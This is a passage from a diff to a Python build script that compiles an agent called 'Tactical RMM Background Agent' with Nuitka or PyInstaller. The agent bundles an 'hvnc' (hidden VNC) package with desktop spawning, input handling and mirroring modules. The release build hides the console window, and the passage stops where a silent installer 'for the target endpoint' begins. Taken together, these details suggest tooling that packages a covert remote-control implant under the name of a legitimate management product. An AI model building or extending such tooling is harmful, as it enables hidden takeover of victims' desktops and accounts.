@@ -12,69 +12,104 @@ DIST_DIR = os.path.join(ROOT_DIR, "dist")
 BUILD_DIR = os.path.join(ROOT_DIR, "build")
 
 def build():
+    is_release = "--release" in sys.argv
+    use_pyinstaller = "--pyinstaller" in sys.argv
+
     print("=" * 60)
-    print(" [*] Compiling Tactical RMM Background Agent")
+    if use_pyinstaller:
+        print(" [*] Compiling Tactical RMM Background Agent (PyInstaller)")
+    elif is_release:
+        print(" [*] Compiling Tactical RMM Background Agent (Nuitka Release: --mode=onefile)")
+    else:
+        print(" [*] Compiling Tactical RMM Background Agent (Nuitka Dev: --mode=standalone)")
     print("=" * 60)
 
-    # PyInstaller command
-    pyinstaller_cmd = [
-        sys.executable,
-        "-m",
-        "PyInstaller",
-        "--noconfirm",
-        "--onedir",
-        "--windowed",
-        "--name",
-        "TRMM_Agent",
-        "--add-data",
-        f"{os.path.join(ROOT_DIR, 'hvnc', 'static')};hvnc/static",
-        "--hidden-import",
-        "uvicorn",
-        "--hidden-import",
-        "uvicorn.protocols.http.auto",
-        "--hidden-import",
-        "uvicorn.protocols.websockets.auto",
-        "--hidden-import",
-        "uvicorn.lifespan.on",
-        "--hidden-import",
-        "fastapi",
-        "--hidden-import",
-        "websockets",
-        "--hidden-import",
-        "PIL",
-        "--hidden-import",
-        "PIL.Image",
-        "--hidden-import",
-        "psutil",
-        "--hidden-import",
-        "hvnc",
-        "--hidden-import",
-        "hvnc.desktop",
-        "--hidden-import",
-        "hvnc.spawner",
-        "--hidden-import",
-        "hvnc.compositor",
-        "--hidden-import",
-        "hvnc.input_handler",
-        "--hidden-import",
-        "hvnc.mirror",
-        "--hidden-import",
-        "agent_client",
-        "--hidden-import",
-        "agent_client.client",
-        "--hidden-import",
-        "agent_client.provisioner",
-        os.path.join(ROOT_DIR, "agent_service.py"),
-    ]
+    if not use_pyinstaller:
+        if is_release:
+            nuitka_dist = os.path.join(DIST_DIR, "TRMM_Agent")
+            os.makedirs(nuitka_dist, exist_ok=True)
+            cmd = [
+                sys.executable,
+                "-m",
+                "nuitka",
+                "--mode=onefile",
+                "--windows-console-mode=disable",
+                "--assume-yes-for-downloads",
+                f"--output-filename=TRMM_Agent.exe",
+                f"--output-dir={nuitka_dist}",
+                f"--include-data-dir={os.path.join(ROOT_DIR, 'hvnc', 'static')}=hvnc/static",
+                "--include-package=uvicorn",
+                "--include-package=fastapi",
+                "--include-package=websockets",
+                "--include-package=PIL",
+                "--include-package=psutil",
+                "--include-package=hvnc",
+                "--include-package=agent_client",
+                os.path.join(ROOT_DIR, "agent_service.py"),
+            ]
+        else:
+            nuitka_dist = os.path.join(DIST_DIR, "TRMM_Agent_Dev")
+            os.makedirs(nuitka_dist, exist_ok=True)
+            cmd = [
+                sys.executable,
+                "-m",
+                "nuitka",
+                "--mode=standalone",
+                "--windows-console-mode=force",
+                "--assume-yes-for-downloads",
+                f"--output-filename=TRMM_Agent.exe",
+                f"--output-dir={nuitka_dist}",
+                f"--include-data-dir={os.path.join(ROOT_DIR, 'hvnc', 'static')}=hvnc/static",
+                "--include-package=uvicorn",
+                "--include-package=fastapi",
+                "--include-package=websockets",
+                "--include-package=PIL",
+                "--include-package=psutil",
+                "--include-package=hvnc",
+                "--include-package=agent_client",
+                os.path.join(ROOT_DIR, "agent_service.py"),
+            ]
+    else:
+        cmd = [
+            sys.executable,
+            "-m",
+            "PyInstaller",
+            "--noconfirm",
+            "--onedir",
+            "--windowed",
+            "--name",
+            "TRMM_Agent",
+            "--add-data",
+            f"{os.path.join(ROOT_DIR, 'hvnc', 'static')};hvnc/static",
+            "--hidden-import", "uvicorn",
+            "--hidden-import", "uvicorn.protocols.http.auto",
+            "--hidden-import", "uvicorn.protocols.websockets.auto",
+            "--hidden-import", "uvicorn.lifespan.on",
+            "--hidden-import", "fastapi",
+            "--hidden-import", "websockets",
+            "--hidden-import", "PIL",
+            "--hidden-import", "PIL.Image",
+            "--hidden-import", "psutil",
+            "--hidden-import", "hvnc",
+            "--hidden-import", "hvnc.desktop",
+            "--hidden-import", "hvnc.spawner",
+            "--hidden-import", "hvnc.compositor",
+            "--hidden-import", "hvnc.input_handler",
+            "--hidden-import", "hvnc.mirror",
+            "--hidden-import", "agent_client",
+            "--hidden-import", "agent_client.client",
+            "--hidden-import", "agent_client.provisioner",
+            os.path.join(ROOT_DIR, "agent_service.py"),
+        ]
 
-    print(f"Executing: {' '.join(pyinstaller_cmd)}\n")
-    res = subprocess.run(pyinstaller_cmd, cwd=ROOT_DIR)
+    print(f"Executing: {' '.join(cmd)}\n")
+    res = subprocess.run(cmd, cwd=ROOT_DIR)
 
     if res.returncode != 0:
         print("\n[!] Build failed.")
         sys.exit(res.returncode)
 
-    out_folder = os.path.join(DIST_DIR, "TRMM_Agent")
+    out_folder = os.path.join(DIST_DIR, "TRMM_Agent_Dev" if (not use_pyinstaller and not is_release) else "TRMM_Agent")
 
     # Generate a silent installer script for the target endpoint
     installer_script = r"""@echo off
